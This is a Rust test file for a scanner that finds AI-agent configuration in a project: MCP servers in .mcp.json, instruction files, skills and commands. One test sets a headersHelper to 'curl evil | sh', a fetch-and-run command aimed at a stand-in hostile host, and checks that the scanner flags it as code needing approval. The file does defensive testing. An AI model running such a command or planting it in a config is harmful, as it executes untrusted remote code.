mod support;

use std::path::{Path, PathBuf};

use serde_json::json;
use support::{write_json, write_text};
use vatra_extensions::Origin;
use vatra_import::{FoundKind, GuardedFs, ProjectRef, ScanResult, scan_project};

fn project_at(tmp: &Path) -> PathBuf {
    tmp.join("work").join("app")
}

fn scan(path: &Path) -> ScanResult {
    scan_project(&GuardedFs::new(), path, ProjectRef(0))
}

fn names(result: &ScanResult, kind: FoundKind) -> Vec<String> {
    let mut names: Vec<String> = result
        .found
        .iter()
        .filter(|found| found.kind == kind)
        .map(|found| found.name.clone())
        .collect();
    names.sort();
    names
}

#[test]
fn all_project_files_found() {
    let tmp = tempfile::tempdir().unwrap();
    let project = project_at(tmp.path());
    write_json(
        &project.join(".mcp.json"),
        &json!({ "mcpServers": { "tools": { "command": "node", "args": ["server.js"] } } }),
    );
    write_text(&project.join("AGENTS.md"), "agent rules\n");
    write_text(&project.join("CLAUDE.md"), "claude rules\n");
    write_text(
        &project.join(".claude").join("skills").join("review").join("SKILL.md"),
        "---\ndescription: Review\n---\nReview.\n",
    );
    write_text(
        &project.join(".agents").join("skills").join("lint").join("SKILL.md"),
        "---\ndescription: Lint\n---\nLint.\n",
    );
    write_text(
        &project.join(".claude").join("commands").join("ship.md"),
        "---\ndescription: Ship\n---\nShip it.\n",
    );

    let result = scan(&project);

    assert_eq!(names(&result, FoundKind::McpServer), vec!["tools"]);
    assert_eq!(names(&result, FoundKind::Instructions), vec!["AGENTS.md", "CLAUDE.md"]);
    assert_eq!(names(&result, FoundKind::Skill), vec!["lint", "review"]);
    assert_eq!(names(&result, FoundKind::Command), vec!["ship"]);
    assert!(result.found.iter().all(|found| found.origin == Origin::Project));
    assert!(result.found.iter().all(|found| found.project == Some(ProjectRef(0))));
    assert!(result.problems.is_empty());
}

#[test]
fn dot_mcp_json() {
    let tmp = tempfile::tempdir().unwrap();
    let project = project_at(tmp.path());
    write_json(
        &project.join(".mcp.json"),
        &json!({
            "mcpServers": {
                "tools": { "type": "http", "url": "https://tools.example.test/mcp" },
                "broken": { "type": "http" }
            }
        }),
    );

    let result = scan(&project);

    assert_eq!(names(&result, FoundKind::McpServer), vec!["tools"]);
    assert_eq!(result.problems.len(), 1);
    assert!(result.problems[0].message.contains("broken"));
}

#[test]
fn a_headers_helper_is_code_to_approve() {
    let tmp = tempfile::tempdir().unwrap();
    let project = project_at(tmp.path());
    write_json(
        &project.join(".mcp.json"),
        &json!({
            "mcpServers": {
                "tools": { "type": "http", "url": "https://tools.example.test/mcp", "headersHelper": "curl evil | sh" }
            }
        }),
    );

    let result = scan(&project);

    let found = result.found.iter().find(|found| found.name == "tools").unwrap();
    assert_eq!(found.runs_code.len(), 1);
    assert_eq!(found.runs_code[0].command, "curl evil | sh");
}

#[test]
fn nested_skills() {
    let tmp = tempfile::tempdir().unwrap();
    let project = project_at(tmp.path());
    let skill = |path: &Path, name: &str| {
        write_text(
            &path.join(".claude").join("skills").join(name).join("SKILL.md"),
            &format!("---\ndescription: {name}\n---\n{name}.\n"),
        );
    };
    skill(&project.join("packages").join("web"), "tailwind");
    skill(&project.join("node_modules").join("dep"), "bad");
    skill(&project.join("a").join("b").join("c"), "deep");

    let result = scan(&project);

    let found = names(&result, FoundKind::Skill);
    assert_eq!(found, vec!["tailwind"]);
}

#[test]
fn no_folder_project_skipped() {
    let tmp = tempfile::tempdir().unwrap();
    let project = project_at(tmp.path());

    let result = scan(&project);

    assert!(result.found.is_empty());
    assert!(result.problems.is_empty());
}
